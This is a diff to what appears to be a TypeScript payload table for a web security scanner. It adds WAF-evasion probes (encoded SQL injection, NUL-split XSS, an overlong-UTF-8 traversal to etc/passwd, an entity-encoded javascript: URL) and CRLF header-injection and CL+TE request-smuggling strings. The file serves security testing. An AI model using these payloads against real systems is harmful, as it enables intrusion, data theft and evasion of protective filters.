@@ -81,6 +81,25 @@ export const SECURITY_PAYLOADS: Record<string, PayloadCategory> = {
       "*{7*7}",
       "{{config.items()}}"
     ]
+  },
+  evasion: {
+    type: "evasion",
+    description: "UTF-8 overlong, IIS %uXXXX unicode, NUL byte, and double-encoding WAF evasion probes",
+    payloads: [
+      "%u0027 OR 1=1--",
+      "%2527 UNION SELECT 1,2--",
+      "<s%00cript>alert(1)</script>",
+      "%2e%2e%c0%afetc/passwd",
+      "&#106;avascript:alert(1)"
+    ]
+  },
+  smuggling: {
+    type: "smuggling",
+    description: "RFC 9112 CRLF header splitting and CL+TE request smuggling probes",
+    payloads: [
+      "x\r\nX-Wide-Smuggle: injected",
+      "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n"
+    ]
   }
 };
 
